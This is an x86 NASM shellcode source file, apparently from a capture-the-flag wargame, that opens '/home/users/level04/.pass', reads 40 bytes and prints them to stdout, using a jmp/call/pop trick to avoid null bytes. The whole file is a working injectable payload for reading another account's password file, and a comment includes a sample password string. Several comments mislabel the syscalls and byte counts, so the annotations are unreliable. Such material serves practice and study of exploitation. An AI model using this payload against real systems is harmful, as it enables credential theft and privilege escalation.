BITS 32 ; Tell nasm this is 32-bit code.

	jmp short one ; Jump down to a call at the end.
two:
; int open(const char *pathname, int flags, ...
	pop ebx ; Pop the return address (string ptr) into ebx.
	xor eax, eax ; initialise register eax.
	xor ecx, ecx ; initialise register ecx.
	mov al, 5 ; Write syscall open.
	int 0x80 ; Do syscall: write(1, string, 14) -> put the fd in eax

; ssize_t read(int fd, void buf[.count], size_t count);
	sub esp, 64 ; reserve space for buf
	mov ebx, eax ; put the return value in ebx
	xor eax, eax ; initialise register eax.
	mov al, 3 ; Write syscall read.
	mov ecx, esp ; Put the adresse of buffer in ecx
	xor edx, edx ; initialise register edx.
	mov dl, 40 ; Length of the .pass (eg. kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf)
	int 0x80 ; Do syscall: read(eax, buf, 41) -> put the nb of bytes read in eax

; ssize_t write(int fd, const void *buf, size_t count);
	mov edx, eax ; Write the nb of bytes catch by read
	xor eax, eax ; initialise register eax.
	xor ebx, ebx ; initialise register ebx.
	mov al, 4 ; Write syscall write.
	mov bl, 1 ; Write fd for stdout
	; for ecx, and edx it's the same as read so no change needed
	int 0x80 ; Do syscall: write(1, buf, 41) -> put the nb of bytes read in eax

; void _exit(int status);
	xor eax, eax ; initialise register eax.
	xor ebx, ebx ; initialise register ebx.
	mov al, 1 ; Exit syscall #
	;sub bl, 1 ; Status = 0
	int 0x80 ; Do syscall: exit(0)

one:
	call two ; Call back upwards to avoid null bytes
	db "/home/users/level04/.pass"
